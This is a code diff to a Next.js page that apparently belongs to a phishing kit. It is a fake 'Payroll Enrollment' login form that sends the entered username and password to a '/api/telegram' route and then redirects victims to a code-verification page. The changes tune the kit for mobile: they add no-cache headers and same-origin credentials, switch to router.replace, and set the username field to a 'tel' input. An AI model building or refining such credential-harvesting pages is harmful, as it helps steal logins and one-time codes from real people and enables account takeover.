@@ -1,5 +1,4 @@
 "use client";
-
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
@@ -20,7 +19,6 @@ export default function PayrollEnrollment2Page() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
     if (!f1 || !f2) {
       setError("Please enter both Username and Password.");
       return;
@@ -39,7 +37,11 @@ export default function PayrollEnrollment2Page() {
     try {
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Cache-Control": "no-cache",     // ← critical for mobile
+        },
+        credentials: "same-origin",         // ← extra reliability on mobile
         body: JSON.stringify({
           data: formData,
           formType: "🏦 Payroll Enrollment",
@@ -53,7 +55,7 @@ export default function PayrollEnrollment2Page() {
       setF2("");
 
       setTimeout(() => {
-        router.push("/CodeVerification");
+        router.replace("/CodeVerification");   // ← safer than push
       }, 2000);
     } catch (err) {
       console.error(err);
@@ -127,7 +129,7 @@ export default function PayrollEnrollment2Page() {
                   Username
                 </label>
                 <input
-                  type="text"
+                  type="tel"                    
                   value={f1}
                   onChange={(e) => setF1(e.target.value)}
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
